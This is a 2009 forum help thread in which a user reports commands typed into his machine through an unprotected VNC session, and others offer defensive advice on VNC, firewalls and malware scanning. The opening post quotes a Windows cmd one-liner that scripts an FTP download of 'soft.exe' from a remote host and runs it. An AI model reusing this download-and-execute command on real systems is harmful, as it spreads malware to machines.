---
title: "I think i got hacked! :S"
date: 2009-08-19
forum: General Help
---

### Post by Dev'olution on 2009-08-19
```
%systemroot%\system32\cmd.exe
cmd /c echo open IP 21 >> ik &echo user dsluser telnet >> ik &echo binary >> ik &echo get soft.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &soft.exe &exit

%systemroot%\system32\cmd.exe
cmd /c echo open IP 21 >> ik &echo user dsluser telnet >> ik &echo binary >> ik &echo get soft.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &soft.exe &exit
```

Got hell freaked out.

My machine started beeping like hell... then i look at it and it's typing stuff into my console!!!

I had VNC open with no password, but no ports are forwarded and i need to use VNC on my network. What should i do? Change my VNC password? How could they get in with no ports forwarded? 

:cry:

---

### Post by MaxIBoy on 2009-08-19
Looks like someone is trying to execute Windows shellcode on your system. :P

On Ubuntu, you aren't in any danger from that, but I suggest disconnecting VNC ASAP.

---

### Post by Dev'olution on 2009-08-19
Also, is there a chance that my windows machines may have been affected?

---

### Post by Copernicus1234 on 2009-08-19
soft.exe is malware. Do you have a windows machine in your network? Its probably infected by this malware and it tried to spread to your ubuntu machine. :)

maxiBoy: I dont see any shellcode?

---

### Post by Dev'olution on 2009-08-19
I have a home PC, which is pretty much used 24/7 but doesnt have VNC... my other server does tho.

---

### Post by doas777 on 2009-08-19
> **MaxIBoy said:**
> Looks like someone is trying to execute Windows shellcode on your system. :P

On Ubuntu, you aren't in any danger from that, but I suggest disconnecting VNC ASAP.


that it does. lol.

if you need secure remote access look into freenx (ssh-based, easy setup and is a good protocol).
[https://help.ubuntu.com/community/FreeNX](https://help.ubuntu.com/community/FreeNX)

---

### Post by Dev'olution on 2009-08-19
While i'm at it, is there an easy way to configure my firewall on the machine. ala GUI?

---

### Post by MaxIBoy on 2009-08-19
On your windows machine, all the firewalls in the world won't save you if you continue using unsecured VNC. Does your router have a firewall? It would be advisable to enable that instead (assuming the computers connected by VNC are both within the same LAN and behind the same router.) That possibly *would* secure you, since the entire VNC is behind a firewall. But no guarantees, you should use a password on VNC from now on anyway.

On the windows machine, you should download this [free tool]("http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&subj=dl&tag=button") and run a full check. This tool is really great, I've used it on horribly screwed up school computers before, to get them back on their feet. No substitute for a full antivirus program but it's good for catching "that bug going around." 



> **Copernicus1234 said:**
> soft.exe is malware. Do you have a windows machine in your network? Its probably infected by this malware and it tried to spread to your ubuntu machine. :)

maxiBoy: I dont see any shellcode?
Doesn't shellcode just mean "code that runs under the CLI shell?" In this case cmd.exe.

---

### Post by Dev'olution on 2009-08-19
Thanks Maxiboy, I used Malwarebytes at my old work (Service and Support), just never had any real experience with VNC!

---

### Post by credobyte on 2009-08-19
[http://personalfirewall.comodo.com/](http://personalfirewall.comodo.com/) - haven't found a better one.

---

### Post by Copernicus1234 on 2009-08-19
> **MaxIBoy said:**
> 
Doesn't shellcode just mean "code that runs under the CLI shell?" In this case cmd.exe.

I think this is a more common definition: [http://en.wikipedia.org/wiki/Shellcode](http://en.wikipedia.org/wiki/Shellcode). Its often used for [http://en.wikipedia.org/wiki/Buffer_overflow](http://en.wikipedia.org/wiki/Buffer_overflow) to get root access.

---

### Post by Dev'olution on 2009-08-19
Was more hoping ubuntu wise :D

---

### Post by doas777 on 2009-08-20
ok, it already sounds like you have a router firewall (most likely running a spi engine).
that means that your windows machine is probably acting as a proxy for the attack, unless you can find reason to believe that they were able to penetrate your router. it is possible with several UPNP hacks so be sure to disable UPNP and SMNP on your router to close that hole.

go through your windows machine with a fine tooth comb. malwarebytes is a pretty good offline scaner (AVG is the top-detecting free one) but offline scanners miss a lot of the polymorphic strains, because you have to rely on their behavior to catch them, not a static signature for the binary code. unfourtunatly you won't find any free tools to perform these functions. 

I recomend Kaspersky IS but a few other companies have good behavoiral capabilities as well. 

basically, I tell my users (when they've conned me into working on their personal PCs) that they need to have an up to date AV subscription after the first repair, and if they don't on the second, there won't be a third. you just can't go cheap with security (even if your not buying much).

---

### Post by doas777 on 2009-08-20
> **WestAussieUbu said:**
> Was more hoping ubuntu wise :D

specifically? remove vnc. it can never be secured. especially if the attacker is already on your local network, half measures will no longer suffice.

as I said previously, freeNX is a good alternative for remote access, that is reasonably secure, and hard to break. after installing it, be sure to install fail2ban, so that after a certian number of bad login attempts, the remote IP is blocked. this prevents them from using brute force password cracking to break in.

---

